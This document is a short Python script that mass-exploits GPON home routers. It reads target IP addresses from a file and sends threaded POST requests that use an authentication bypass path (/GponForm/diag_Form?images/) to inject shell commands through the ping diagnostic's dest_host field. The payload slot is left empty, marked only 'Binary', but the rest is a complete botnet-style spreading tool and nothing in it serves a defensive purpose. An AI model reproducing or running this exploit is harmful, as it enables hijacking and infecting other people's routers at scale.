#!/usr/bin/env python
#By: Choudai;
import sys, requests, time, ssl, threading


ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
payload = '' #Binary
exploit = 'XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`' + payload + '`;' + payload + '&ipv=0'
ips = open(sys.argv[1], 'r').readlines()


class gpon(threading.Thread):
        def __init__ (self, ip):
            threading.Thread.__init__(self)
            self.ip = str(ip).rstrip('\n')
            
        def run(self):
            try:
                bypass = 'http://' + self.ip + '/GponForm/diag_Form?images/'
                req = requests.Request('POST', bypass, data=exploit)
                prepared = req.prepare()
                s = requests.Session()
                s.send(prepared)
            except:
                pass


for ip in ips:
    try:
        g = gpon(ip)
        g.start()
        time.sleep(0.1)
    except:
        pass
